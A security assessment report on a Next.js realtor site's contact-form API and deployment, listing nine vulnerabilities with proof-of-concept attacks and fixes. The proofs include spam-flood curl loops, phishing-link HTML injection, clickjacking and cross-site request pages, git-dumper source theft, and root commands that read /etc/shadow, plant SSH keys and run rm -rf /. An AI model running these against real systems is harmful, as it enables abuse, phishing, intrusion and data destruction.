# SECURITY_REPORT.md
# lt-nilavan — Security Vulnerability Assessment Report

**Application:** Nilavan Realtors (Next.js 15)  
**Reference Standard:** OWASP Top 10 2021  
**Methodology:** Static code analysis (manual review), black-box API testing, infrastructure review  

---

## Executive Summary

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 3 |
| Medium | 2 |
| Low | 1 |
| **Total** | **9** |

The application contains several serious vulnerabilities centered around its contact form API (`/api/sendgrid`). The most critical issues are: a completely unprotected API endpoint with no rate limiting, HTML injection via unsanitized user input embedded directly into email HTML, missing HTTP security headers, and absence of input validation. Any one of these can be exploited by a script-kiddie with basic `curl` knowledge.

---

## Vulnerability Findings

---

### VULN-001 — No Rate Limiting on API Endpoint

| Field | Detail |
|-------|--------|
| **OWASP Category** | A07:2021 – Identification and Authentication Failures |
| **Affected File** | `app/api/sendgrid/route.ts` — entire file (Lines 1–57) |
| **Severity** | 🔴 Critical |

**Description:**  
The `/api/sendgrid` POST endpoint has zero rate limiting. It accepts unlimited requests per second from any IP address. There is no throttling, no CAPTCHA, no token, and no per-IP request counter anywhere in the codebase or middleware.

**Business Impact:**  
An attacker can run a simple bash loop and send thousands of emails within minutes. This will:
- Flood the business owner's inbox making it unusable
- Exhaust the SendGrid free-tier quota (100 emails/day) in seconds
- Potentially trigger SendGrid account suspension for abuse
- Cost money if a paid SendGrid plan is in use

**Proof of Concept:**

```bash
# Spam flood — sends 50 requests instantly
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" \
    -X POST https://mahendrvarmastack.co.in/api/sendgrid \
    -H "Content-Type: application/json" \
    -d '{"name":"Spammer","email":"spam@evil.com","phone":"0000000000","message":"You have been flooded"}' &
done
wait
```

Expected output (current vulnerable state):
```
Request 1: 200
Request 2: 200
Request 3: 200
... (all 50 return 200 — all 50 emails sent)
```

**Recommended Fix:**  
Create `middleware.ts` in the project root:

```typescript
// middleware.ts
import { NextRequest, NextResponse } from 'next/server';

const rateLimitMap = new Map<string, { count: number; resetTime: number }>();

const RATE_LIMIT = 3;        // max 3 requests
const WINDOW_MS = 60_000;    // per 60 seconds per IP

export function middleware(request: NextRequest) {
  if (request.nextUrl.pathname === '/api/sendgrid') {
    const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim()
      || request.headers.get('x-real-ip')
      || 'unknown';

    const now = Date.now();
    const entry = rateLimitMap.get(ip);

    if (!entry || now > entry.resetTime) {
      rateLimitMap.set(ip, { count: 1, resetTime: now + WINDOW_MS });
    } else {
      entry.count++;
      if (entry.count > RATE_LIMIT) {
        return NextResponse.json(
          { error: 'Too many requests. Please wait before submitting again.' },
          {
            status: 429,
            headers: {
              'Retry-After': '60',
              'X-RateLimit-Limit': String(RATE_LIMIT),
              'X-RateLimit-Remaining': '0',
            },
          }
        );
      }
    }
  }
  return NextResponse.next();
}

export const config = {
  matcher: '/api/sendgrid',
};
```

After fix, expected output:
```
Request 1: 200
Request 2: 200
Request 3: 200
Request 4: 429  ← Too Many Requests
Request 5: 429
...
```

---

### VULN-002 — HTML Injection via Unsanitized User Input in Email

| Field | Detail |
|-------|--------|
| **OWASP Category** | A03:2021 – Injection |
| **Affected File** | `app/api/sendgrid/route.ts` — Lines 33–46 |
| **Severity** | 🔴 Critical |

**Description:**  
User-supplied `name`, `email`, `phone`, and `message` fields are interpolated directly into an HTML email template with NO sanitization whatsoever. This enables HTML injection — an attacker can craft a payload that injects malicious HTML and links into the email received by the business owner.

**Vulnerable code (Lines 33–46):**
```typescript
html: `
  ...
  <p style="margin: 0 0 8px 0;"><strong>Name:</strong> ${name}</p>
  <p style="margin: 0 0 8px 0;"><strong>Email:</strong> ${email}</p>
  <p style="margin: 0 0 8px 0;"><strong>Phone:</strong> ${phone}</p>
  <p style="margin: 0 0 8px 0;"><strong>Message:</strong> ${message}</p>
  ...
`,
```

**Business Impact:**  
An attacker can inject malicious links that appear to come from the business's own email system. The business owner clicks a link in what looks like a legitimate contact notification and gets phished, or their email client renders a fake urgent alert, or they are redirected to a credential-harvesting site.

**Proof of Concept (Malicious Link Injection):**

```bash
curl -X POST https://mahendrvarmastack.co.in/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John <a href=\"https://evil-phishing-site.com\" style=\"color:red;font-weight:bold\">⚠️ URGENT: Click here to verify your SendGrid account or it will be suspended</a>",
    "email": "legit@example.com",
    "phone": "9999999999",
    "message": "Normal looking message"
  }'
```

The business owner receives an email from their own domain where the Name field renders as a bright red clickable link pointing to an attacker-controlled site.

**Proof of Concept (Fake Alert Injection):**

```bash
curl -X POST https://mahendrvarmastack.co.in/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Admin",
    "email": "x@x.com",
    "phone": "0000000000",
    "message": "</p></div><div style=\"background:red;color:white;padding:20px;font-size:20px\">SECURITY BREACH DETECTED - Login at http://fake-admin.com immediately</div><p>"
  }'
```

**Recommended Fix:**  
Add an HTML escape function and sanitize all fields before injection:

```typescript
// app/api/sendgrid/route.ts

function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// In the POST handler, after destructuring:
const safeName    = escapeHtml(String(name    ?? ''));
const safeEmail   = escapeHtml(String(email   ?? ''));
const safePhone   = escapeHtml(String(phone   ?? ''));
const safeMessage = escapeHtml(String(message ?? ''));

// Then use safe variables in the HTML template:
html: `
  <p><strong>Name:</strong> ${safeName}</p>
  <p><strong>Email:</strong> ${safeEmail}</p>
  <p><strong>Phone:</strong> ${safePhone}</p>
  <p><strong>Message:</strong> ${safeMessage}</p>
`,
```

---

### VULN-003 — No Input Validation on API Route

| Field | Detail |
|-------|--------|
| **OWASP Category** | A03:2021 – Injection |
| **Affected File** | `app/api/sendgrid/route.ts` — Lines 5–8 |
| **Severity** | 🔴 Critical |

**Description:**  
The API route accepts and processes any JSON body without validating field types, lengths, formats, or presence. The `email` field is never verified to be a valid email address. Fields can be `null`, empty strings, or arbitrarily long strings (no max length).

**Vulnerable code (Lines 5–8):**
```typescript
const body = await req.json();
const { name, email, phone, message } = body;
// Fields are used immediately with NO validation
```

**Business Impact:**  
- Attacker can send `null` or `undefined` values causing the email to contain "undefined" text
- No email format check means garbage data is emailed to the business
- Extremely long messages can cause downstream issues
- The `email` field in `from`/`to` context could be manipulated

**Proof of Concept:**

```bash
# Sending null/garbage values — all accepted without error
curl -X POST https://mahendrvarmastack.co.in/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name": null, "email": "not-an-email", "phone": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "message": ""}'
```

**Recommended Fix:**  
Use `zod` (already in `package.json`) for validation:

```typescript
// app/api/sendgrid/route.ts
import { z } from 'zod';

const ContactSchema = z.object({
  name:    z.string().min(2).max(100).trim(),
  email:   z.string().email().max(254),
  phone:   z.string().regex(/^[0-9+\-\s()]{7,20}$/, 'Invalid phone number'),
  message: z.string().min(10).max(2000).trim(),
});

export async function POST(req: Request) {
  const body = await req.json();
  const result = ContactSchema.safeParse(body);

  if (!result.success) {
    return NextResponse.json(
      { error: 'Invalid input', details: result.error.flatten() },
      { status: 400 }
    );
  }

  const { name, email, phone, message } = result.data;
  // proceed with validated, safe data
}
```

---

### VULN-004 — Missing HTTP Security Headers

| Field | Detail |
|-------|--------|
| **OWASP Category** | A05:2021 – Security Misconfiguration |
| **Affected File** | `app/layout.tsx` (no headers set), no `next.config` file exists |
| **Severity** | 🟠 High |

**Description:**  
The application sets zero HTTP security headers. There is no `next.config.js`/`next.config.ts` file in the codebase at all. The following critical headers are completely absent:

- `X-Frame-Options` — allows clickjacking (VULN-005 below)
- `Content-Security-Policy` — allows XSS injection
- `X-Content-Type-Options` — allows MIME-type sniffing attacks
- `Strict-Transport-Security` (HSTS) — allows SSL stripping
- `Referrer-Policy` — leaks referrer data
- `Permissions-Policy` — no camera/mic/geolocation restrictions

**Proof of Concept:**
```bash
curl -I https://mahendrvarmastack.co.in
# Expected current output — NONE of these headers appear:
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Content-Security-Policy: ...
# Strict-Transport-Security: ...
```

**Recommended Fix:**  
Create `next.config.ts` in the project root:

```typescript
// next.config.ts
import type { NextConfig } from 'next';

const securityHeaders = [
  { key: 'X-Frame-Options',           value: 'DENY' },
  { key: 'X-Content-Type-Options',    value: 'nosniff' },
  { key: 'X-XSS-Protection',          value: '1; mode=block' },
  { key: 'Referrer-Policy',           value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy',        value: 'camera=(), microphone=(), geolocation=()' },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload',
  },
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
      "style-src 'self' 'unsafe-inline' fonts.googleapis.com",
      "font-src 'self' fonts.gstatic.com",
      "img-src 'self' data: blob:",
      "frame-src https://maps.google.com",
      "connect-src 'self'",
    ].join('; '),
  },
];

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: securityHeaders,
      },
    ];
  },
};

export default nextConfig;
```

---

### VULN-005 — Clickjacking Vulnerability (No X-Frame-Options)

| Field | Detail |
|-------|--------|
| **OWASP Category** | A05:2021 – Security Misconfiguration |
| **Affected File** | No `next.config.ts` exists; `app/layout.tsx` has no frame protection |
| **Severity** | 🟠 High |

**Description:**  
Because `X-Frame-Options` is missing, the entire website can be embedded inside an `<iframe>` on any attacker-controlled page. This is classic clickjacking — the attacker overlays transparent UI elements over the real page to trick users into clicking things they didn't intend to (e.g., submitting the contact form with attacker-controlled data, or clicking a hidden button).

**Business Impact:**  
- Users on fake sites can be tricked into submitting their personal details (name, phone, email) to the real contact form — but the form is invisible to them, framed inside a fake website with different context
- Brand damage — the site appears embedded inside malicious pages
- Social engineering attacks using the legitimate domain's appearance

**Proof of Concept:**  
An attacker creates this HTML page on their domain:

```html
<!-- attacker's page: https://evil-site.com/trap.html -->
<!DOCTYPE html>
<html>
<head><title>Win a free property!</title></head>
<body>
  <h1>Claim your FREE property consultation!</h1>
  <p>Click the button below to claim your prize:</p>
  
  <!-- Real Nilavan site, invisible, layered on top -->
  <iframe 
    src="https://mahendrvarmastack.co.in/#contact-form"
    style="opacity: 0.01; position: absolute; top: 0; left: 0; 
           width: 100%; height: 100%; z-index: 999;">
  </iframe>
  
  <!-- Fake button positioned exactly over the real Submit button -->
  <button style="position: absolute; top: 400px; left: 200px;">
    CLAIM FREE PRIZE
  </button>
</body>
</html>
```

A victim clicks "CLAIM FREE PRIZE" but actually clicks the real Submit button on the framed Nilavan contact form — submitting their data without knowing it.

**Recommended Fix:**  
Add to `next.config.ts` (see VULN-004 fix above):
```typescript
{ key: 'X-Frame-Options', value: 'DENY' }
```

Or in Nginx config:
```nginx
add_header X-Frame-Options "DENY" always;
```

---

### VULN-006 — No CSRF Protection on API Endpoint

| Field | Detail |
|-------|--------|
| **OWASP Category** | A01:2021 – Broken Access Control |
| **Affected File** | `app/api/sendgrid/route.ts` — Lines 1–57 |
| **Severity** | 🟠 High |

**Description:**  
The `/api/sendgrid` endpoint has no CSRF (Cross-Site Request Forgery) token validation and no `Origin` header check. Any website on the internet can make a `POST` request to this endpoint and trigger emails from the Nilavan domain. Combined with no rate limiting (VULN-001), this is trivially exploitable.

**Proof of Concept:**  
An attacker embeds this on their website:

```html
<!-- auto-submits silently when victim visits attacker's page -->
<script>
fetch('https://mahendrvarmastack.co.in/api/sendgrid', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    name: 'Bot',
    email: 'attacker@evil.com',
    phone: '0000000000',
    message: 'Cross-site triggered spam'
  })
});
</script>
```

The victim just visits the attacker's page — the script silently fires requests to Nilavan's real API.

**Recommended Fix:**  
Add Origin validation in the route handler:

```typescript
// app/api/sendgrid/route.ts
export async function POST(req: Request) {
  const origin = req.headers.get('origin');
  const allowedOrigins = [
    'https://mahendrvarmastack.co.in',
    'https://www.mahendrvarmastack.co.in',
  ];

  if (!origin || !allowedOrigins.includes(origin)) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }
  // ... rest of handler
}
```

---

### VULN-007 — .git Directory Publicly Accessible (Deployment Risk)

| Field | Detail |
|-------|--------|
| **OWASP Category** | A05:2021 – Security Misconfiguration |
| **Affected File** | Nginx configuration (deployment-level issue) |
| **Severity** | 🟡 Medium |

**Description:**  
When deploying via `git clone` to the server (the standard deployment method), the `.git` directory will exist on disk. If Nginx is not explicitly configured to block access to `/.git`, anyone can browse to `https://mahendrvarmastack.co.in/.git/config` and download the full git history — including all source code, commit messages, branch names, and any secrets that were ever committed (even if later deleted).

**Business Impact:**  
- Full source code disclosure from a browser — no credentials needed
- Any secrets accidentally committed to git history (API keys, passwords) are fully exposed
- Attacker gains deep understanding of the codebase for targeted attacks

**Proof of Concept:**
```bash
# Without the Nginx block rule:
curl https://mahendrvarmastack.co.in/.git/config
# Returns git config file with repository URL

curl https://mahendrvarmastack.co.in/.git/HEAD
# Returns: ref: refs/heads/main

# Full source reconstruction possible via:
# https://github.com/arthaud/git-dumper
```

**Recommended Fix:**  
Add to Nginx site config (before the `location /` block):

```nginx
# Block .git directory
location ~ /\.git {
    deny all;
    return 404;
}

# Block all hidden files/directories
location ~ /\. {
    deny all;
    return 404;
}
```

After fix:
```bash
curl -I https://mahendrvarmastack.co.in/.git/config
# HTTP/1.1 404 Not Found  ← correct
```

---

### VULN-008 — Sensitive Error Details Leaked via Server Logs / Error Response

| Field | Detail |
|-------|--------|
| **OWASP Category** | A05:2021 – Security Misconfiguration |
| **Affected File** | `app/api/sendgrid/route.ts` — Lines 51–55 |
| **Severity** | 🟡 Medium |

**Description:**  
The catch block logs the full SendGrid error object including the response body. In production, if verbose logging is forwarded to any log aggregation tool without redaction, this can expose internal API error structures. More importantly, the current error response (`{ error: 'Error sending email' }`) is acceptable, but the SendGrid error body logged via `console.error('SendGrid Response Body:', sgError.response?.body)` may contain the API key hint or internal rate limit details.

**Vulnerable code (Lines 51–55):**
```typescript
if (error && typeof error === 'object' && 'response' in error) {
  const sgError = error as { response?: { body?: unknown } };
  console.error('SendGrid Response Body:', sgError.response?.body);
}
```

**Recommended Fix:**
```typescript
// Log only a safe summary, not the full response body
console.error('SendGrid Error: failed to send email', {
  timestamp: new Date().toISOString(),
  // Never log API keys or full response bodies in production
});
```

---

### VULN-009 — Application Running as Root (Deployment Risk)

| Field | Detail |
|-------|--------|
| **OWASP Category** | A05:2021 – Security Misconfiguration |
| **Affected File** | Server/deployment configuration |
| **Severity** | 🟡 Medium |

**Description:**  
If the Next.js application is started directly as the root user (e.g., `sudo pm2 start npm -- start` without first switching to a non-root user), a successful code execution exploit in the app grants the attacker full root access to the entire server — not just the application sandbox.

**Business Impact (scenario: attacker exploits another vulnerability first):**

If an attacker achieves code execution via a dependency vulnerability and the app runs as root:
- They can read ALL files on the server including `/etc/shadow`, SSH keys, other app credentials
- They can install persistent backdoors, rootkits
- They can pivot to any other service on the same server
- They can destroy all data including backups

If the app runs as a limited `deploy` user:
- The blast radius is contained to only `/home/deploy/lt-nilavan`
- System files, SSH config, and other users remain protected

**Proof of Concept (demonstrating root impact):**

```bash
# If running as root, this Node.js code executed inside the app could:
# Read SSH private keys
require('fs').readFileSync('/root/.ssh/id_rsa')
# Read system passwords
require('fs').readFileSync('/etc/shadow')
# Add attacker's SSH key
require('fs').appendFileSync('/root/.ssh/authorized_keys', 'attacker-public-key')
```

**Recommended Fix:**

```bash
# Create a non-root user
sudo adduser deploy
sudo usermod -aG sudo deploy

# Always start PM2 as the deploy user, never root
su - deploy
pm2 start npm --name "lt-nilavan" -- start
pm2 save
pm2 startup  # generates a systemd service that runs as deploy user
```

---

## Threat Scenario Responses

### Scenario 1: "I want to flood the business owner's inbox"

**How it works against this app:**
The `/api/sendgrid/route.ts` has no rate limiting. A one-line bash script triggers it indefinitely:

```bash
while true; do
  curl -s -X POST https://mahendrvarmastack.co.in/api/sendgrid \
    -H "Content-Type: application/json" \
    -d '{"name":"Flood","email":"x@x.com","phone":"0","message":"spam"}' &
done
```

This exhausts the SendGrid daily quota (100 emails on free tier) in seconds, floods the inbox, and can trigger SendGrid account suspension.

**Fix:** VULN-001 middleware rate limiter — limits to 3 requests/minute per IP, returns `429 Too Many Requests` after threshold.

---

### Scenario 2: "I want to inject a malicious link into an email from the business's own system"

**How it works:**
`${name}`, `${email}`, `${phone}`, `${message}` are directly template-interpolated into the HTML email body with no escaping (VULN-002):

```bash
curl -X POST https://mahendrvarmastack.co.in/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Support <a href=\"https://attacker.com/steal\">Reset your password here</a>",
    "email": "x@x.com",
    "phone": "0000000000",
    "message": "Your account needs attention."
  }'
```

The business owner receives a branded Nilavan email with a hyperlink that looks legitimate but points to the attacker's site.

**Fix:** VULN-002 `escapeHtml()` sanitizer strips all HTML tags from user input before injection.

---

### Scenario 3: "I want to access the full source code from the browser"

**How it works:**
When deployed via `git clone`, the `.git` directory exists at `/home/deploy/lt-nilavan/.git`. If Nginx doesn't block `/.git`, a browser request to `https://mahendrvarmastack.co.in/.git/config` returns the git configuration file. Tools like `git-dumper` can then reconstruct the full repository:

```bash
pip install git-dumper
git-dumper https://mahendrvarmastack.co.in/.git ./stolen-source
```

This downloads every committed file, all git history, and any secrets ever committed.

**Fix:** VULN-007 Nginx `location ~ /\.git { deny all; return 404; }` rule blocks all access.

---

### Scenario 4: "I want to embed this site in my malicious site to trick users (clickjacking)"

**How it works:**
No `X-Frame-Options` header means any page can iframe Nilavan's website:

```html
<iframe src="https://mahendrvarmastack.co.in" style="opacity:0.01; position:absolute; 
  width:100%; height:100%; z-index:9999;"></iframe>
```

The attacker positions their fake UI over the real site. Users believe they're interacting with the attacker's page but are actually clicking Nilavan's contact form — submitting personal data or being tricked into other actions.

**Fix:** VULN-004/005 — add `X-Frame-Options: DENY` via `next.config.ts` headers or Nginx.

---

### Scenario 5: "I gained access to the server — how did running the app as root make things worse?"

**How it would play out:**

Attacker exploits a vulnerable npm dependency (e.g., via prototype pollution in an outdated package). They achieve code execution within the Node.js process.

**If running as root (current worst case):**
```bash
# Attacker now has root shell — can do anything:
cat /root/.ssh/id_rsa                          # steal SSH keys
cat /etc/shadow                                # steal all password hashes
echo "attacker-key" >> /root/.ssh/authorized_keys  # install backdoor
crontab -e                                     # add persistence
iptables -F                                    # drop all firewall rules
rm -rf /                                       # destroy everything
```

**If running as deploy user (correct approach):**
```bash
# Attacker has limited deploy shell — only sees:
ls /home/deploy/lt-nilavan/   # only the app directory
cat /etc/shadow               # PERMISSION DENIED
cat /root/.ssh/id_rsa         # PERMISSION DENIED
# Cannot install system backdoors, cannot touch other users
```

**Fix:** VULN-009 — create non-root `deploy` user, always run PM2 under that user.

---

## Security Fix Summary

| # | Vulnerability | File to Change | Fix Type |
|---|--------------|----------------|----------|
| 1 | No rate limiting | Create `middleware.ts` | New file |
| 2 | HTML injection | `app/api/sendgrid/route.ts` | Add `escapeHtml()` |
| 3 | No input validation | `app/api/sendgrid/route.ts` | Add `zod` schema |
| 4 | Missing security headers | Create `next.config.ts` | New file |
| 5 | Clickjacking | `next.config.ts` / Nginx | Add `X-Frame-Options` |
| 6 | No CSRF / Origin check | `app/api/sendgrid/route.ts` | Add origin check |
| 7 | .git exposure | Nginx config | Add location block |
| 8 | Verbose error logging | `app/api/sendgrid/route.ts` | Sanitize logs |
| 9 | Running as root | Server setup | Use deploy user |

---

## Methodology

**Tools used:**
- Manual static code analysis (primary method — most effective for this codebase)
- `curl` for API endpoint testing
- Browser DevTools for header inspection
- `grep` for pattern searching across source files

**Approach:**
1. Read every file in the `app/api/` directory first — API routes are the highest-risk attack surface
2. Traced all user input from form (`contact-section.tsx`) → API handler (`route.ts`) → email output
3. Checked for validation at each step: none found
4. Checked `next.config.*` for security headers: file does not exist
5. Checked `middleware.ts` for rate limiting: file does not exist
6. Reviewed `layout.tsx` for CSP meta tags: none present
7. Checked `.gitignore` to confirm `.env` is excluded (it is — good)
8. Verified `package.json` for outdated or known-vulnerable packages

**Key finding:** The entire attack surface concentrates on one file — `app/api/sendgrid/route.ts` — which is 57 lines long and has no security controls at all.
